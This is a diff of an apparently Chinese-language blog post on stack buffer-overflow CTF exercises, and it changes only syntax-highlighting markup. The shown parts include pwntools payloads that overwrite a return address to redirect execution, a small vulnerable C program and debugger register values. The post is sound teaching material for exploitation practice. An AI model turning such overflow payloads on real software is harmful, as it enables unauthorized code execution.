@@ -113,9 +113,9 @@
 
 <span class="n">payload</span> <span class="o">=</span> <span class="s">'a'</span><span class="o">*</span><span class="mh">0x18</span> <span class="o">+</span> <span class="s">'bbbb'</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x8048480</span><span class="p">)</span>
 
-<span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">sh</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
 
-<span class="n">sh</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+<span class="n">sh</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
 
 </code></pre></div></div>
 
@@ -143,7 +143,7 @@
 
 <p>  我们在<strong>gets()</strong>那里打上断点，然后看一下寄存器的值：</p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$esp -&gt; 0xffffd030
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$esp -&gt; 0xffffd030
 
 $ebp -&gt; 0xffffd0b8
 
@@ -163,9 +163,9 @@ s @ $esp+0x1c -&gt; 0xffffd04c
 
 <span class="n">payload</span> <span class="o">=</span> <span class="s">'a'</span><span class="o">*</span><span class="mh">0x6c</span> <span class="o">+</span> <span class="s">'bbbb'</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">target</span><span class="p">)</span>
 
-<span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span> 
+<span class="n">sh</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span> 
 
-<span class="n">sh</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>     
+<span class="n">sh</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>     
 </code></pre></div></div>
 
 <p>  下面就是我们的结果：</p>
@@ -176,8 +176,8 @@ s @ $esp+0x1c -&gt; 0xffffd04c
 
 <p>  这个题就比较简单了，程序也是我自己写的，下面是源码：</p>
 
-<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;stdio.h&gt;   
-#include &lt;string.h&gt;  
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="c1">   </span><span class="cp">
+#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="c1">  </span><span class="cp">
 </span>
 <span class="kt">void</span> <span class="nf">success</span><span class="p">()</span> <span class="p">{</span> 
     <span class="n">puts</span><span class="p">(</span><span class="s">"You Hava already controlled it."</span><span class="p">);</span> 
@@ -215,9 +215,9 @@ s @ $esp+0x1c -&gt; 0xffffd04c
 <span class="n">payload</span> <span class="o">=</span> <span class="s">'a'</span> <span class="o">*</span> <span class="mi">20</span> <span class="o">+</span> <span class="s">'bbbb'</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">success_addr</span><span class="p">)</span>
 
 <span class="k">print</span> <span class="n">p32</span><span class="p">(</span><span class="n">success_addr</span><span class="p">)</span>
-<span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">sh</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
 
-<span class="n">sh</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+<span class="n">sh</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
 </code></pre></div></div>
 
 <p>  然后结果就长这个样子：</p>
